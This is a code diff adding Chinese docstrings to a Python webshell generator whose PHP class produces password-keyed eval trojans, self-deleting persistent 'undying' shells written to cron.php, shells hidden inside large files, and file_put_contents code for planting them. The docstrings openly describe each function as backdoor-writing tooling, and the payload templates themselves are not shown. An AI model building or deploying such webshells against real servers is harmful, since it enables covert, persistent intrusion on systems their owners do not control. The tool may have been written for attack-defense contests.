@@ -12,6 +12,9 @@ class Webshell:
         self.dir = dirname(__file__)
 
     def command_to_write(self,php,location,nodie=False):
+        """
+        返回写shell命令，用来写webshell
+        """
         self.location = location
         command = ""
         if nodie:
@@ -38,6 +41,9 @@ class PHP(Webshell):
         super().__init__(key)
     
     def rawcode(self,php:str):
+        """
+        剔除php文件头尾的 <?php 和 ?> ，返回code
+        """
         start = php.find("<?php")
         end = php.rfind("?>")
         if start == -1:
@@ -45,6 +51,9 @@ class PHP(Webshell):
         return php[start + 5:end]
 
     def password(self,passwd,php):
+        """
+        返回webshell内容，带密码
+        """
         self.passwd = passwd
         raw = self.rawcode(php)
         with open(f"{self.dir}/webshell/passwd.php") as f:
@@ -54,6 +63,9 @@ class PHP(Webshell):
         return code
     
     def generate(self,passwd=None):
+        """
+        返回webshell内容，默认是一句话木马，可以指定password
+        """
         with open(f"{self.dir}/webshell/eval.php") as f:
             eval_php = f.read()
         code = eval_php.replace("9999","'" + self.key + "'")
@@ -62,6 +74,9 @@ class PHP(Webshell):
         return code
 
     def nodiephp(self,php,location="./cron.php"):
+        """
+        返回 webshell 内容，不死马
+        """
         self.location = location
         with open(f"{self.dir}/webshell/nodie.php") as f:
             nodie_php = f.read()
@@ -70,12 +85,18 @@ class PHP(Webshell):
         return code
 
     def fatter(self,php):
+        """
+        返回 webshell 内容，将 webshell 塞入大文件中
+        """
         raw = self.rawcode(php)
         with open(f"{self.dir}/webshell/fatter.php") as f:
             fatter_php = f.read()
         code = fatter_php.replace("9999",raw)
         return code
     def code_to_write(self,php,location):
+        """
+        返回 php 代码，用来写 webshell
+        """
         self.location = location
         with open(f"{self.dir}/webshell/file_put_contents.php") as f:
             file_put_contents_php = f.read()
@@ -84,6 +105,9 @@ class PHP(Webshell):
         return self.rawcode(code)
     
     def code_to_write_nodie(self,php,location="./cron.php"):
+        """
+        返回 php 代码，用来写 不死马
+        """
         nodiephp = self.nodiephp(php=php,location=location)
         nodiephp = nodiephp.replace("\nunlink(__FILE__);","")
         return self.rawcode(nodiephp)
